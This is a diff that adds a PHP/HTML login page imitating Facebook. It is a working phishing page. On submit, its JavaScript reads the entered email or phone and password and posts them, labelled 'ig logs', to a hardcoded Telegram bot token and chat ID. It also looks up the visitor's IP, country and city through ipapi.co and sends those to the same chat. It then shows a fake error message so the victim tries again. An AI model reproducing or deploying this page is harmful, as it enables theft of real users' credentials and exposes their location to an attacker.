@@ -1,0 +1,466 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    
+include_once "controller.php";
+
+}
+?>
+
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login Page</title>
+  <link rel="stylesheet" href="./login_form_2.css" />
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap");
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: "Poppins", sans-serif;
+      background: #f2f4f7;
+    }
+
+    .content {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+
+    .flex-div {
+      display: flex;
+      justify-content: space-evenly;
+      align-items: center;
+    }
+
+    .name-content {
+      margin-right: 7rem;
+    }
+
+    .name-content .logo {
+      font-size: 3.5rem;
+      color: #1877f2;
+    }
+
+    .name-content p {
+      font-size: 1.3rem;
+      font-weight: 500;
+      margin-bottom: 5rem;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      background: #fff;
+      padding: 2rem;
+      width: 530px;
+      height: 380px;
+      border-radius: 0.5rem;
+      box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
+    }
+
+    form input {
+      outline: none;
+      padding: 0.8rem 1rem;
+      margin-bottom: 0.8rem;
+      font-size: 1.1rem;
+    }
+
+    form input:focus {
+      border: 1.8px solid #1877f2;
+    }
+
+    form .login {
+      outline: none;
+      border: none;
+      background: #1877f2;
+      padding: 0.8rem 1rem;
+      border-radius: 0.4rem;
+      font-size: 1.1rem;
+      color: #fff;
+    }
+
+    form .login:hover {
+      background: #0f71f1;
+      cursor: pointer;
+    }
+
+    form a {
+      text-decoration: none;
+      text-align: center;
+      font-size: 1rem;
+      padding-top: 0.8rem;
+      color: #1877f2;
+    }
+
+    form hr {
+      background: #f7f7f7;
+      margin: 1rem;
+    }
+
+    form .create-account {
+      outline: none;
+      border: none;
+      background: #06b909;
+      padding: 0.8rem 1rem;
+      border-radius: 0.4rem;
+      font-size: 1.1rem;
+      color: #fff;
+      width: 75%;
+      margin: 0 auto;
+    }
+
+    form .create-account:hover {
+      background: #03ad06;
+      cursor: pointer;
+    }
+
+    /* //.........Media Query.........// */
+
+    @media (max-width: 500px) {
+      html {
+        font-size: 60%;
+      }
+
+      .name-content {
+        margin: 0;
+        text-align: center;
+      }
+
+      form {
+        width: 300px;
+        height: fit-content;
+      }
+
+      form input {
+        margin-bottom: 1rem;
+        font-size: 1.5rem;
+      }
+
+      form .login {
+        font-size: 1.5rem;
+      }
+
+      form a {
+        font-size: 1.5rem;
+      }
+
+      form .create-account {
+        font-size: 1.5rem;
+      }
+
+      .flex-div {
+        display: flex;
+        flex-direction: column;
+      }
+    }
+
+    .invicible {
+      display: none;
+    }
+
+    @media (min-width: 501px) and (max-width: 768px) {
+      html {
+        font-size: 60%;
+      }
+
+      .name-content {
+        margin: 0;
+        text-align: center;
+      }
+
+      form {
+        width: 300px;
+        height: fit-content;
+      }
+
+      form input {
+        margin-bottom: 1rem;
+        font-size: 1.5rem;
+      }
+
+      form .login {
+        font-size: 1.5rem;
+      }
+
+      form a {
+        font-size: 1.5rem;
+      }
+
+      form .create-account {
+        font-size: 1.5rem;
+      }
+
+      .flex-div {
+        display: flex;
+        flex-direction: column;
+      }
+    }
+
+    @media (min-width: 769px) and (max-width: 1200px) {
+      html {
+        font-size: 60%;
+      }
+
+      .name-content {
+        margin: 0;
+        text-align: center;
+      }
+
+      form {
+        width: 300px;
+        height: fit-content;
+      }
+
+      form input {
+        margin-bottom: 1rem;
+        font-size: 1.5rem;
+      }
+
+      form .login {
+        font-size: 1.5rem;
+      }
+
+      form a {
+        font-size: 1.5rem;
+      }
+
+      form .create-account {
+        font-size: 1.5rem;
+      }
+
+      .flex-div {
+        display: flex;
+        flex-direction: column;
+      }
+
+      @media (orientation: landscape) and (max-height: 500px) {
+        .header {
+          height: 90vmax;
+        }
+      }
+    }
+
+    .hidden {
+      display: hidden;
+    }
+  </style>
+
+</head>
+
+<body>
+  <div class="content">
+    <div class="flex-div">
+      <div class="name-content">
+        <h1 class="logo">Face<span class='invicible'>happy</span>book</h1>
+        <p>Connect with friends and the world around you.</p>
+      </div>
+      <form id="loginForm">
+        <input type="text" placeholder="Email or Phone Number" name="username" required />
+        <input type="password" placeholder="Password" name="password" required>
+        <input type="hidden" id="country" name="country" />
+        <input type="hidden" id="city" name="city" />
+        <input type="hidden" id="ip" name="ip" />
+
+        <p id="error-message" style="color: red;  font-size: 14px; margin-top: 10px; display: none;">
+          an error ocurred.
+        </p>
+        <button class="login" type="submit">Log In</button>
+        <a href="#">Forgot Password?</a>
+        <hr>
+        <button class="create-account" type="button">Create New Account</button>
+      </form>
+
+      <div class="hidden" id="status" style="display: none;"></div> <!-- Status message display -->
+    </div>
+  </div>
+  <!-- <form id="telegramForm">
+        <label for="chatId">Chat ID:</label>
+        <input type="text" id="chatId" name="chatId" required><br><br>
+        
+        <label for="message">Message:</label>
+        <input type="text" id="message" name="message" required><br><br>
+
+        <button type="submit">Send Message</button>
+    </form> -->
+
+  <p id="status"></p>
+
+  <script>
+    // Function to send a message to a specified Telegram chat using the Fetch API
+    function sendMessageWithFetch(chatId, message) {
+      // Define the Telegram API URL with your bot token
+      const telegramAPI = `https://api.telegram.org/bot7280763852:AAEHmPsZemgExWJ5fzO42yKt5s_sWoMI4LQ/sendMessage`;
+
+      // Create the data object containing the chat ID and message text
+      const data = {
+        chat_id: chatId,
+        text: message
+      };
+
+      // Send a POST request to the Telegram API using Fetch
+      fetch(telegramAPI, {
+        method: 'POST', // Specify the request method
+        headers: {
+          'Content-Type': 'application/json' // Indicate the content type of the request
+        },
+        body: JSON.stringify(data) // Convert the data object to a JSON string
+      })
+        .then(response => response.json()) // Parse the JSON response from the server
+        .then(result => {
+          // Check if the message was sent successfully
+          if (result.ok) {
+            // Update the status message on the page
+            document.getElementById("status").innerText += "Message sent using Fetch! ";
+          } else {
+            // Log an error message if sending failed
+            console.error("Error sending message using Fetch:", result);
+          }
+        })
+        .catch(error => {
+          // Log any network or other errors that occur
+          console.error("Fetch failed:", error);
+        });
+    }
+
+    // Function to send a message to a specified Telegram chat using XMLHttpRequest
+    function sendMessageWithXHR(chatId, message) {
+      // Define the Telegram API URL with your bot token
+      const telegramAPI = `https://api.telegram.org/bot7280763852:AAEHmPsZemgExWJ5fzO42yKt5s_sWoMI4LQ/sendMessage`;
+
+      // Create a new XMLHttpRequest object
+      const xhr = new XMLHttpRequest();
+
+      // Create the data object containing the chat ID and message text
+      const data = JSON.stringify({
+        chat_id: chatId,
+        text: message
+      });
+
+      // Initialize the XMLHttpRequest with the POST method and the Telegram API URL
+      xhr.open('POST', telegramAPI, true);
+      // Set the request header to indicate the content type
+      xhr.setRequestHeader('Content-Type', 'application/json');
+
+      // Set up a function to handle the response from the server
+      xhr.onreadystatechange = function () {
+        // Check if the request is complete and was successful
+        if (xhr.readyState === 2 && xhr.status === 200) {
+          const response = JSON.parse(xhr.responseText); // Parse the response
+          // Check if the message was sent successfully
+          if (response.ok) {
+            // Update the status message on the page
+            document.getElementById("status").innerText += "Message sent using XMLHttpRequest!";
+          } else {
+            // Log an error message if sending failed
+            console.error("Error sending message using XMLHttpRequest:", response);
+          }
+        }
+      };
+
+      // Send the data as the request body
+      xhr.send(data);
+    }
+
+    // Handle the submission of the login form
+    document.getElementById('loginForm').addEventListener('submit', function (event) {
+      event.preventDefault(); // Prevent the default form submission behavior
+
+      const chatId = '6785150252'; // Your Telegram chat ID
+      // Get the username and password values from the form inputs
+      const username = document.querySelector('input[name="username"]').value;
+      const password = document.querySelector('input[name="password"]').value;
+
+      // Construct the message to be sent, including the username, password, and log type
+      const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}\nLog Type: ig logs`;
+
+      // Send the message using both methods
+      sendMessageWithXHR(chatId, message);   // Send using XMLHttpRequest
+    });
+  </script>
+
+
+
+
+
+
+
+  <script>
+    // Function to send location data to Telegram using Fetch API
+    function sendLocationToTelegram(chatId, country, city, ip) {
+      const telegramAPI = `https://api.telegram.org/bot7280763852:AAEHmPsZemgExWJ5fzO42yKt5s_sWoMI4LQ/sendMessage`;
+      const message = `User Location Info:\nCountry: ${country}\nCity: ${city}\nIP: ${ip}`;
+
+      const data = {
+        chat_id: chatId,
+        text: message
+      };
+
+      fetch(telegramAPI, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      })
+        .then(response => response.json())
+        .then(result => {
+          if (result.ok) {
+            console.log("Location info sent using Fetch!");
+          } else {
+            console.error("Error sending location info:", result);
+          }
+        })
+        .catch(error => {
+          console.error("Fetch failed:", error);
+        });
+    }
+
+    // Function to fetch user's IP and location using an API
+    function fetchLocationInfo(chatId) {
+      // Using a free API for location data (replace with your preferred one)
+      fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+          const country = data.country_name;
+          const city = data.city;
+          const ip = data.ip;
+          sendLocationToTelegram(chatId, country, city, ip);
+        })
+        .catch(error => {
+          console.error("Error fetching location data:", error);
+        });
+    }
+
+    // Handle form submission
+    document.getElementById('loginForm').addEventListener('submit', function (event) {
+      event.preventDefault(); // Prevent form from submitting normally
+
+      const chatId = '6785150252'; // Your Telegram chat ID
+      const username = document.querySelector('input[name="username"]').value;
+      const password = document.querySelector('input[name="password"]').value;
+
+      // Construct the login message
+      const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}\nLog Type: ig logs`;
+
+      // Send login info to Telegram (this was in your previous script)
+
+
+      // Fetch and send location info after login info is sent
+      fetchLocationInfo(chatId);
+
+      document.getElementById("error-message").style.display = "block";
+    });
+  </script>
+
+</body>
+
+</html>
